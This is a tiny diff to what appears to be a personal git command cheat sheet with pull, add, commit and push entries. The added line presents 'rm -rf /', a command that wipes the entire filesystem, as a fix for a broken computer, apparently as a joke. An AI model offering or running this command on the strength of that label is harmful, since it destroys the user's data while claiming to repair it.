@@ -3,3 +3,4 @@ pulling:	git pull
 adding:		git add --all
 commit:		git commit -am "stuff"
 pushing:	git push origin master
+fixing your entire computer if it's all screwed up: rm -rf /
